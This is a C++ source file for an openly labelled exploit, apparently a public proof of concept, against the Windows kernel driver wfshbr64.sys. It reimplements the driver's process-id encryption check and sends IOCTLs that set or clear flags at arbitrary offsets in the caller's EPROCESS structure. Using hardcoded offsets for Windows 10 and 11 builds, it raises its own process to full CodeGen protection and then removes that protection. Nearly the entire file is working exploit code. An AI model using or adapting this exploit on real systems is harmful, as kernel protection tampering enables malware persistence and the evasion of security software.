// The MIT License (MIT) https://opensource.org/licenses/MIT
//
// Copyright (c) 2022 Kento Oki <hrn832@protonmail.com>
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <iostream>

#include "lazy_importer.hpp"

#define WFSHBR_DEVICE_TYPE 0xAA01

#define IOCTL_WFSHBR_QUERY_SEED                        \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE10, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA013840

#define IOCTL_WFSHBR_REMOVE_FLAG                       \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE20, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA013880

#define IOCTL_WFSHBR_ADD_FLAG                          \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE21, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA013884

#define IOCTL_WFSHBR_AND_FLAG                          \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE22, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA013888

#define IOCTL_WFSHBR_QUERY_RANDOM_1                    \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE30, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA0138C0

#define IOCTL_WFSHBR_QUERY_RANDOM_2                    \
  CTL_CODE(WFSHBR_DEVICE_TYPE, 0xE31, METHOD_BUFFERED, \
           FILE_ANY_ACCESS)  // 0xAA0138C4

#define EVIL_WFSHBR_PRINT(format, ...) printf((format), __VA_ARGS__)

#define EVIL_WFSHBR_PRINT_ERROR(format, ...)  \
  EVIL_WFSHBR_PRINT(                          \
      " \x1b[002m│\x1b[0m "                 \
      "\x1b[0;1;41m[FAIL]\x1b[0m"             \
      " \x1b[002m│\x1b[0m " format "\x1b[0m", \
      __VA_ARGS__)

#define EVIL_WFSHBR_PRINT_INFO(format, ...)   \
  EVIL_WFSHBR_PRINT(                          \
      " \x1b[002m│\x1b[0m "                 \
      "\x1b[0;104;1m[INFO]\x1b[0m"            \
      " \x1b[002m│\x1b[0m " format "\x1b[0m", \
      __VA_ARGS__)

typedef struct _PS_PROTECTION {
  union {
    UCHAR Level;
    struct {
      UCHAR Type : 3;
      UCHAR Audit : 1;
      UCHAR Signer : 4;
    } Flags;
  };
} PS_PROTECTION, *PPS_PROTECTION;

typedef enum _PS_PROTECTED_SIGNER {
  PsProtectedSignerNone = 0,
  PsProtectedSignerAuthenticode = 1,
  PsProtectedSignerCodeGen = 2,
  PsProtectedSignerAntimalware = 3,
  PsProtectedSignerLsa = 4,
  PsProtectedSignerWindows = 5,
  PsProtectedSignerWinTcb = 6,
  PsProtectedSignerMax = 7
} PS_PROTECTED_SIGNER;

typedef enum _PS_PROTECTED_TYPE {
  PsProtectedTypeNone = 0,
  PsProtectedTypeProtectedLight = 1,
  PsProtectedTypeProtected = 2,
  PsProtectedTypeMax = 3
} PS_PROTECTED_TYPE;

NTSTATUS WINAPI RtlGetVersion(OSVERSIONINFOEXW* Version);

#define ProcessProtectionInformation ((PROCESSINFOCLASS)(0x3D))  // 61

typedef struct _WFSHBR_IOCTL_QUERY_SEED {
  //
  // if succeeded, driver sets this field to 1UL.
  //
  _Out_ ULONG IsSucceeded;

  //
  // if succeeded, driver seed is returned in this field.
  // This seed is low part of the 8-byte value obtained
  // from the KeQuerySystemTime, whis is initialized
  // whenever the driver entry point is called.
  //
  _Out_ ULONG Seed;
} WFSHBR_IOCTL_QUERY_SEED, *PWFSHBR_IOCTL_QUERY_SEED;
static_assert(sizeof(WFSHBR_IOCTL_QUERY_SEED) == 0x8,
              "struct size must be 0x8");

typedef struct _WFSHBR_IOCTL_FLAG_OPERATION {
  //
  // Arbitrary offset of the EPROCESS to manipulate
  // with bitwise operation.
  //
  // The driver doesn't verify that this is the actual
  // _EPROCESS::Protection offset.
  // As such, you can specify any value but only within
  // 0x1000 value.
  //
  _In_ ULONG ArbitraryEProcessOffset;

  //
  // This is the flag you want to set it in the _EPROCESS
  // offset specified in previous field.
  // This is arbitrary and no limitation and no verification
  // is proceeded in the driver.
  //
  _In_ ULONG DesiredFlags;

  //
  // This value is not target process.
  // The target process is limited only self as driver references
  // (PsGetCurrentProcess + ArbitraryEProcessOffset).
  //
  // However, the driver verifies that the request is actually
  // comes from their desired usage by encrypting self-process id.
  //
  _In_ ULONG EncryptedSelfProcessId;
} WFSHBR_IOCTL_FLAG_OPERATION, *PWFSHBR_IOCTL_FLAG_OPERATION;
static_assert(sizeof(WFSHBR_IOCTL_FLAG_OPERATION) == 0xC,
              "struct size must be 0xC");

typedef struct _WFSHBR_IOCTL_RESULT {
  //
  // if succeeded, driver sets 1UL to this field.
  //
  _Out_ ULONG Result;
} WFSHBR_IOCTL_RESULT, *PWFSHBR_IOCTL_RESULT;
static_assert(sizeof(WFSHBR_IOCTL_RESULT) == 0x4, "struct size must be 0x4");

#pragma pack(4)
typedef struct _WFSHBR_IOCTL_QUERY_RANDOM_1_RESULT {
  //
  // if succeeded, driver sets 1UL to this field.
  //
  _Out_ ULONG Result;
  union {
    struct {
      _Out_ ULONG LowPart;
      _Out_ ULONG HighPart;
    };
    ULONGLONG QuadPart;
  };
} WFSHBR_IOCTL_QUERY_RANDOM_1_RESULT, *PWFSHBR_IOCTL_QUERY_RANDOM_1_RESULT;
static_assert(sizeof(WFSHBR_IOCTL_QUERY_RANDOM_1_RESULT) == 0xC,
              "struct size must be 0xC");
#pragma pack()

typedef struct _WFSHBR_IOCTL_QUERY_RANDOM_2_RESULT {
  //
  // if succeeded, driver sets 1UL to this field.
  //
  _Out_ ULONG Result;
  _Out_ ULONG Value;
} WFSHBR_IOCTL_QUERY_RANDOM_2_RESULT, *PWFSHBR_IOCTL_QUERY_RANDOM_2_RESULT;
static_assert(sizeof(WFSHBR_IOCTL_QUERY_RANDOM_2_RESULT) == 0x8,
              "struct size must be 0x8");

typedef struct _EVIL_WFSHBR_DYN_CONTEXT {
  struct {
    ULONG Protection;  // _EPROCESS::Protection<PS_PROTECTION>
  } EPROCESS;
} EVIL_WFSHBR_DYN_CONTEXT, *PEVIL_WFSHBR_DYN_CONTEXT;

#define WINVER_WIN11_22H2 (22621)
#define WINVER_WIN11_21H2 (22000)
#define WINVER_WIN10_21H2 (19044)
#define WINVER_WIN10_21H1 (19043)
#define WINVER_WIN10_20H2 (19042)
#define WINVER_WIN10_2004 (19041)
#define WINVER_WIN10_1909 (18363)
#define WINVER_WIN10_1903 (18362)
#define WINVER_WIN10_1809 (17763)
#define WINVER_WIN10_1803 (17134)
#define WINVER_WIN10_1709 (16299)
#define WINVER_WIN10_1703 (15063)
#define WINVER_WIN10_1607 (14393)
#define WINVER_WIN10_1511 (10586)
#define WINVER_WIN10_1507 (10240)

//
// Global variables.
//

inline EVIL_WFSHBR_DYN_CONTEXT g_EvilWfshbrDynContext = {0};
inline OSVERSIONINFOEXW g_OsVersionInfo = {0};
inline DWORD g_MinorVersion = {0};
inline DWORD g_MajorVersion = {0};
inline DWORD g_BuildNumber = {0};
inline DWORD g_Seed = {0};

/// <summary>
/// Queries the driver seed for this session.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <returns>
/// A proper seed value if succeeded, otherwise, zero.
/// </returns>
ULONG WfshQuerySeed(_In_ HANDLE hDevice) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_QUERY_SEED In{0};

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_QUERY_SEED, NULL, 0, &In,
                       sizeof(In), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return 0;
  }

  if (!In.IsSucceeded) {
    EVIL_WFSHBR_PRINT_INFO("%s: Failed to query seed\n", __FUNCTION__);
    return 0;
  }

  return In.Seed;
}

ULONGLONG WfshQueryRandom1(_In_ HANDLE hDevice) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_QUERY_RANDOM_1_RESULT Out{0};

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_QUERY_RANDOM_1, NULL, 0, &Out,
                       sizeof(Out), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return 0;
  }

  if (!Out.Result) {
    EVIL_WFSHBR_PRINT_INFO("%s: Failed to query random1\n", __FUNCTION__);
    return 0;
  }

  return Out.QuadPart;
}

ULONG WfshQueryRandom2(_In_ HANDLE hDevice) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_QUERY_RANDOM_2_RESULT Out{0};

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_QUERY_RANDOM_2, NULL, 0, &Out,
                       sizeof(Out), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return 0;
  }

  if (!Out.Result) {
    EVIL_WFSHBR_PRINT_INFO("%s: Failed to query random2\n", __FUNCTION__);
    return 0;
  }

  return Out.Value;
}

/// <summary>
/// Obtains protection state of the current process.
/// </summary>
/// <param name="Protection">Specifies a pointer to the protection.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN GetProcessProtection(_Out_ PS_PROTECTION* Protection) {
  NTSTATUS Status;
  ULONG ReturnLength = 0;

  Status = LI_FN(NtQueryInformationProcess)(
      GetCurrentProcess(), ProcessProtectionInformation,
      reinterpret_cast<PVOID>(Protection), sizeof(*Protection), &ReturnLength);

  if (!NT_SUCCESS(Status)) {
    return FALSE;
  }

  return TRUE;
}

/// <summary>
/// The phase 2 of the wfshbr encrypton process.
/// </summary>
/// <param name="PrePlain">Specifies pre-plain proceeded in phase 1.</param>
/// <returns>
/// Always proceeded cipher, no indication of successfull operation.
/// </returns>
ULONG WfshEncryptPhase2(_In_ USHORT PrePlain) {
  ULONG CurrentPrePlain = PrePlain;
  ULONG BitwisePrePlain = 0;

  CurrentPrePlain += 1;
  CurrentPrePlain *= 0xB1F7;

  ULONGLONG Temp = static_cast<ULONGLONG>(0xFFFF0001) *
                   static_cast<ULONGLONG>(CurrentPrePlain);

  BitwisePrePlain = static_cast<DWORD>(Temp >> 32);
  BitwisePrePlain = BitwisePrePlain >> 0x10;
  BitwisePrePlain *= 0x10001;

  CurrentPrePlain -= BitwisePrePlain;
  CurrentPrePlain -= 1;

  return CurrentPrePlain;
}

/// <summary>
/// The phase 1 of the wfshbr encrypton process.
/// </summary>
/// <param name="PrePlain">Specifies pre-plain proceeded in phase 0.</param>
/// <returns>
/// Always proceeded cipher, no indication of successfull operation.
/// </returns>
ULONG WfshEncryptPhase1(_In_ ULONG PrePlain) {
  USHORT Cipher1;
  USHORT Cipher2;

  Cipher1 = WfshEncryptPhase2(PrePlain & 0x0000FFFF);
  Cipher2 = WfshEncryptPhase2(PrePlain >> 16);

  return static_cast<ULONG>((Cipher2 << 16) + Cipher1);
}

/// <summary>
/// The phase 0 of the wfshbr encrypton process.
/// </summary>
/// <param name="Round">Specifies cipher round.</param>
/// <param name="Plain">Specifies plain 4-byte long value to encrypt.</param>
/// <returns>
/// Always proceeded cipher, no indication of successfull operation.
/// </returns>
ULONG WfshEncryptPhase0(_In_ ULONG Round, _In_ ULONG Plain) {
  ULONG CurrentRound = Round;
  ULONG Cipher = 0;
  ULONG XorCipher = Plain;
  ULONG BitwiseCipher = Round;

  do {
    if ((CurrentRound & 0x00000001) == 1) {
      Cipher ^= XorCipher;
    }

    BitwiseCipher = XorCipher;
    XorCipher *= 2;
    BitwiseCipher >>= 0x1F;

    if (BitwiseCipher != 0) {
      XorCipher ^= 0x357935E9;
    }

    CurrentRound >>= 1;
  } while (CurrentRound != 0);

  return Cipher;
}

/// <summary>
/// Encrypts given process id with the given seed.
/// </summary>
/// <param name="ProcessId">Specifies the process id.</param>
/// <param name="Seed">Specifies the seed obtained from the wfshbr
/// driver.</param> <returns> returns encrypted 4-byte value.
/// </returns>
ULONG WfshEncryptPayload(_In_ ULONG ProcessId, _In_ ULONG Seed) {
  ULONG CipherPhase0;
  ULONG CipherPhase1;

  CipherPhase0 = WfshEncryptPhase0(0x77FD097E, Seed + ProcessId);
  CipherPhase1 = WfshEncryptPhase1(CipherPhase0);

  return CipherPhase1;
}

/// <summary>
/// Protects the current process with Full CodeGen.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <param name="AdditionalBitsIndex">Specifies bit flags map index.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN WfshProtectProcess(_In_ HANDLE hDevice,
                           _In_ ULONG AdditionalBitsIndex) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_FLAG_OPERATION In{0};
  PS_PROTECTION Protection;
  Protection.Flags.Signer = PsProtectedSignerCodeGen;
  Protection.Flags.Type = PsProtectedTypeProtected;

  In.EncryptedSelfProcessId = WfshEncryptPayload(GetCurrentProcessId(), g_Seed);
  In.ArbitraryEProcessOffset =
      g_EvilWfshbrDynContext.EPROCESS.Protection - AdditionalBitsIndex;
  In.DesiredFlags = Protection.Level << AdditionalBitsIndex * 8;

  WFSHBR_IOCTL_RESULT Out{0};

  // Adjustment.
  WfshQueryRandom1(hDevice);

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_ADD_FLAG, &In, sizeof(In),
                       &Out, sizeof(Out), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return FALSE;
  }

  //
  // if succeeded, 1UL value is set in the output buffer.
  //

  if (Out.Result == 1) {
    return TRUE;
  }

  return FALSE;
}

/// <summary>
/// Protects the current process with Full CodeGen.
/// With the way enumerates all possible bit flags map index.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN WfsProtectProcessSupreme(_In_ HANDLE hDevice) {
  for (auto Index : {0UL, 1UL, 2UL, 3UL}) {
    if (WfshProtectProcess(hDevice, Index)) {
      return TRUE;
    }
  }

  return FALSE;
}

/// <summary>
/// Unprotects the current process.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <param name="AdditionalBitsIndex">Specifies bit flags map index.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN WfshUnprotectProcess(_In_ HANDLE hDevice,
                             _In_ ULONG AdditionalBitsIndex) {
  DWORD BytesReturned = 0;

  WFSHBR_IOCTL_FLAG_OPERATION In{0};
  PS_PROTECTION Protection;
  Protection.Flags.Signer = PsProtectedSignerCodeGen;
  Protection.Flags.Type = PsProtectedTypeProtected;

  In.EncryptedSelfProcessId = WfshEncryptPayload(GetCurrentProcessId(), g_Seed);
  In.ArbitraryEProcessOffset =
      g_EvilWfshbrDynContext.EPROCESS.Protection - AdditionalBitsIndex;
  In.DesiredFlags = Protection.Level << AdditionalBitsIndex * 8;

  WFSHBR_IOCTL_RESULT Out{0};

  // Adjustment.
  WfshQueryRandom1(hDevice);

  if (!DeviceIoControl(hDevice, IOCTL_WFSHBR_REMOVE_FLAG, &In, sizeof(In),
                       &Out, sizeof(Out), &BytesReturned, NULL)) {
    EVIL_WFSHBR_PRINT_ERROR("%s: DeviceIoControl failed LastError(0x%lX)\n",
                            __FUNCTION__, GetLastError());
    return FALSE;
  }

  //
  // if succeeded, 1UL value is set in the output buffer.
  //

  if (Out.Result == 1) {
    return TRUE;
  }
  

  return FALSE;
}

/// <summary>
/// Unprotects the current process.
/// With the way enumerates all possible bit flags map index.
/// </summary>
/// <param name="hDevice">Specifies wfshbr device handle.</param>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN WfsUnprotectProcessSupreme(_In_ HANDLE hDevice) {
  for (auto Index : {0UL, 1UL, 2UL, 3UL}) {
    if (WfshUnprotectProcess(hDevice, Index)) {
      return TRUE;
    }
  }

  return FALSE;
}

/// <summary>
/// Converts protection signer to the C null-terminated string.
/// </summary>
/// <param name="Protection">Specifies protection.</param>
/// <returns>
/// Always null-terminated C string, never null.
/// </returns>
LPCSTR ProtectSignerToString(_In_ PS_PROTECTION Protection) {
  LPCSTR ProtectSignerString = "UNKNOWN_SIGNER";

  switch (Protection.Flags.Signer) {
    case PS_PROTECTED_SIGNER::PsProtectedSignerNone: {
      ProtectSignerString = "None";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerAntimalware: {
      ProtectSignerString = "Antimalware";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerAuthenticode: {
      ProtectSignerString = "Authenticode";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerCodeGen: {
      ProtectSignerString = "CodeGen";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerLsa: {
      ProtectSignerString = "Lsa";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerWindows: {
      ProtectSignerString = "Windows";
      break;
    }
    case PS_PROTECTED_SIGNER::PsProtectedSignerWinTcb: {
      ProtectSignerString = "WinTcb";
      break;
    }
    default: {
      break;
    }
  }

  return ProtectSignerString;
}

/// <summary>
/// Converts protection type to the C null-terminated string.
/// </summary>
/// <param name="Protection">Specifies protection.</param>
/// <returns>
/// Always null-terminated C string, never null.
/// </returns>
LPCSTR ProtectTypeToString(_In_ PS_PROTECTION Protection) {
  LPCSTR ProtectTypeString = "UNKNOWN_TYPE";

  switch (Protection.Flags.Type) {
    case PS_PROTECTED_TYPE::PsProtectedTypeNone: {
      ProtectTypeString = "None";
      break;
    }
    case PS_PROTECTED_TYPE::PsProtectedTypeProtected: {
      ProtectTypeString = "FULL";
      break;
    }
    case PS_PROTECTED_TYPE::PsProtectedTypeProtectedLight: {
      ProtectTypeString = "LIGHT";
      break;
    }
    default: {
      break;
    }
  }

  return ProtectTypeString;
}

/// <summary>
/// Parses system kernel version and stores into global
/// variables.
/// </summary>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN ParseSystemVersion() {
  NTSTATUS Status;

  // ntdll!RtlGetVersion
  Status = LI_FN(RtlGetVersion)(&g_OsVersionInfo);

  if (!NT_SUCCESS(Status)) {
    return FALSE;
  }

  g_MinorVersion = g_OsVersionInfo.dwMinorVersion;
  g_MajorVersion = g_OsVersionInfo.dwMajorVersion;
  g_BuildNumber = g_OsVersionInfo.dwBuildNumber;

  return TRUE;
}

/// <summary>
/// Parses system kernel offsets and stores into global
/// application context.
/// </summary>
/// <returns>
/// TRUE if succeeded, otherwise, returns FALSE.
/// </returns>
BOOLEAN ParseOffsets() {
  //
  // Only supports Windows 10 and 11 at this time, but this
  // should work on almost whole version of Windows product.
  //
  if (((g_MajorVersion * 10) + g_MinorVersion) != 100) {
    return FALSE;
  }

  //
  // Hardcoding such offsets is not a best practice,
  // but here is just to achieve the exploit result.
  //
  switch (g_BuildNumber) {
    case WINVER_WIN11_22H2:
    case WINVER_WIN11_21H2:
    case WINVER_WIN10_21H2:
    case WINVER_WIN10_21H1:
    case WINVER_WIN10_20H2:
    case WINVER_WIN10_2004: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x87A;
      break;
    }
    case WINVER_WIN10_1909:
    case WINVER_WIN10_1903: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6FA;
      break;
    }
    case WINVER_WIN10_1809:
    case WINVER_WIN10_1803:
    case WINVER_WIN10_1709:
    case WINVER_WIN10_1703: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6CA;
      break;
    }
    case WINVER_WIN10_1607: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6C2;
      break;
    }
    case WINVER_WIN10_1511: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6B2;
      break;
    }
    case WINVER_WIN10_1507: {
      g_EvilWfshbrDynContext.EPROCESS.Protection = 0x6AA;
      break;
    }
    default: {
      return FALSE;
    }
  }

  return TRUE;
}

/// <summary>
/// Prints protection information of the current process.
/// </summary>
void PrintProtectionStatus(void) {
  PS_PROTECTION Protection;

  if (!GetProcessProtection(&Protection)) {
    EVIL_WFSHBR_PRINT_ERROR(
        "Failed to obtain protection information LastError(0x%lX)\n",
        GetLastError());
    return;
  }

  LPCSTR ProtectionSigner;
  LPCSTR ProtectionType;

  ProtectionSigner = ProtectSignerToString(Protection);
  ProtectionType = ProtectTypeToString(Protection);

  if (!Protection.Level) {
    EVIL_WFSHBR_PRINT_INFO("Is Process Protected?: %s\n", "\x1b[91mNo\x1b[0m");
  } else {
    EVIL_WFSHBR_PRINT_INFO(
        "Is Process Protected?: %s [\x1b[92m%s\x1b[0m:\x1b[92m%s\x1b[0m]\n",
        "\x1b[92mYes\x1b[0m", ProtectionType, ProtectionSigner);
  }
}

int main(int argc, const char** argv, const char** envp) {
  UNREFERENCED_PARAMETER(argc);
  UNREFERENCED_PARAMETER(argv);
  UNREFERENCED_PARAMETER(envp);

  //
  // Enable the console colors if supported.
  //

  HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
  DWORD ConsoleMode = 0;
  
  if (GetConsoleMode(hStdOut, &ConsoleMode)) {
    if (!(ConsoleMode & ENABLE_VIRTUAL_TERMINAL_PROCESSING)) {
      ConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
      SetConsoleMode(hStdOut, ConsoleMode);
    }
  }

  EVIL_WFSHBR_PRINT(
    "\x1b[032m"
    " ╭─────────────────────────────────────────────────────────────╮\n"
    " │       \x1b[0m\x1b[36m****\x1b[0m \x1b[0m\x1b[4mEvil Wfshbr by github.com/kkent030315\x1b[0m\x1b[002m \x1b[0m\x1b[36m****\x1b[0m\x1b[032m       │\n"
    " ╰─────────────────────────────────────────────────────────────╯\n"
    "\x1b[0m\n"
    "  LICENSE: MIT License [ \x1b[002mhttps://opensource.org/licenses/MIT\x1b[0m ]\n\n"
    "  WARNING: \x1b[033mBY USING THIS SOFTWARE, YOUR SYSTEM MAY BE CORRUPTED\x1b[0m\n"
    "           \x1b[033mOR BROKEN. USE AT YOUR OWN RISK.\x1b[0m\n\n"
    "  AUTHOR(s): Kento Oki      [ \x1b[002mgithub.com/kkent030315\x1b[0m     ]\n"
    "             Kenjiro Ichise [ \x1b[002mgithub.com/DoranekoSystems\x1b[0m ]\n\n"
    "  This exploit purposely elevate self process to\n"
    "  CodeGen with full protection.\n\n"
    " ──────────────────────────────────────────────────────────────\n\n"
  );

  if (!ParseSystemVersion()) {
    EVIL_WFSHBR_PRINT_ERROR("Failed to parse system version LastError(0x%lX)\n",
                            GetLastError());
    return EXIT_FAILURE;
  }

  EVIL_WFSHBR_PRINT_INFO("MajorVersion=\x1b[2m%d\x1b[0m "
                         "MinorVersion=\x1b[2m%d\x1b[0m "
                         "BuildNumber=\x1b[2m%d\x1b[0m\n",
                         g_MajorVersion, g_MinorVersion, g_BuildNumber);

  if (!ParseOffsets()) {
    EVIL_WFSHBR_PRINT_ERROR("Failed to parse dynamic offsets.\n"
                            "Your system may not supported.\n");
    return EXIT_FAILURE;
  }

  //
  // Check the current protection status of current process.
  //

  PrintProtectionStatus();

  //
  // Open the wfshbr64.sys device.
  //

  HANDLE hDevice;
  hDevice = CreateFile(TEXT("\\\\.\\htsysm7F34"), GENERIC_READ | GENERIC_WRITE,
                       0, NULL, OPEN_EXISTING, 0, NULL);

  if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
    EVIL_WFSHBR_PRINT_ERROR("Failed to open device LastError(0x%lX)\n",
                            GetLastError());

    if (GetLastError() == ERROR_FILE_NOT_FOUND) {
      EVIL_WFSHBR_PRINT_ERROR("You may not have driver wfshbr64.sys loaded.\n");
    } else if (GetLastError() == ERROR_ACCESS_DENIED) {
      EVIL_WFSHBR_PRINT_ERROR("You may not have an proper access rights.\n");
    }

    return EXIT_FAILURE;
  }

  EVIL_WFSHBR_PRINT_INFO("Device Opened: \x1b[002m0x%lX\x1b[0m\n",
                         HandleToULong(hDevice));

  //
  // Query the driver seed as it mandatory in each payloads encryption.
  //

  g_Seed = WfshQuerySeed(hDevice);

  if (!g_Seed) {
    EVIL_WFSHBR_PRINT_ERROR("WfshQuerySeed failed LastError(0x%lX)\n",
                            GetLastError());
    return EXIT_FAILURE;
  }

  EVIL_WFSHBR_PRINT_INFO("Driver Seed: \x1b[32m0x%lX\x1b[0m\n", g_Seed);

  ULONGLONG Random1;
  Random1 = WfshQueryRandom1(hDevice);
  EVIL_WFSHBR_PRINT_INFO("Driver Random(1): \x1b[32m0x%llX\x1b[0m\n", Random1);

  ULONG Random2;
  Random2 = WfshQueryRandom2(hDevice);
  EVIL_WFSHBR_PRINT_INFO("Driver Random(2): \x1b[32m0x%lX\x1b[0m\n", Random2);

  char input;
  do {
    EVIL_WFSHBR_PRINT_INFO(
        "Do you really want to exploit? [\x1b[002mY\x1b[0m/\x1b[002mn\x1b[0m] "
        ": ");
    std::cin >> input;
  } while (!std::cin.fail() && input != 'Y' && input != 'n');

  if (input != 'Y') {
    EVIL_WFSHBR_PRINT_INFO("The operation has successfully canceled.\n");
    return EXIT_SUCCESS;
  }

  //
  // Protect the process.
  //

  EVIL_WFSHBR_PRINT_INFO("Protecting process ...\n");

  BOOLEAN ProtectSuccess = FALSE;

  for (auto Index : {0UL, 1UL, 2UL, 3UL}) {
    if (WfshProtectProcess(hDevice, Index)) {
      EVIL_WFSHBR_PRINT_INFO("\x1b[033m#%d Attempt: Success\x1b[0m\n", Index);
      ProtectSuccess = TRUE;
      break;
    } else {
      EVIL_WFSHBR_PRINT_INFO("\x1b[033m#%d Attempt: Failure\x1b[0m\n", Index);
    }
  }

  if (!ProtectSuccess) {
    EVIL_WFSHBR_PRINT_ERROR("WfshProtectProcess failed LastError(0x%lX)\n",
                            GetLastError());
    return EXIT_FAILURE;
  }

  EVIL_WFSHBR_PRINT_INFO("Process is now protected\n");

  //
  // Check again whether or not the current process is protected.
  //

  PrintProtectionStatus();

  //
  // Unprotect the process.
  //

  EVIL_WFSHBR_PRINT_INFO("Unprotecting process ...\n");

  BOOLEAN UnprotectSuccess = FALSE;

  for (auto Index : {0UL, 1UL, 2UL, 3UL}) {
    if (WfshUnprotectProcess(hDevice, Index)) {
      EVIL_WFSHBR_PRINT_INFO("\x1b[033m#%d Attempt: Success\x1b[0m\n", Index);
      UnprotectSuccess = TRUE;
      break;
    } else {
      EVIL_WFSHBR_PRINT_INFO("\x1b[033m#%d Attempt: Failure\x1b[0m\n", Index);
    }
  }

  if (!UnprotectSuccess) {
    EVIL_WFSHBR_PRINT_ERROR("WfshProtectProcess failed LastError(0x%lX)\n",
                            GetLastError());
    return EXIT_FAILURE;
  }


  EVIL_WFSHBR_PRINT_INFO("Process is now un-protected\n");

  //
  // Check again whether or not the current process is protected.
  //

  PrintProtectionStatus();

  EVIL_WFSHBR_PRINT_INFO("Bye.\n");

  return EXIT_SUCCESS;
}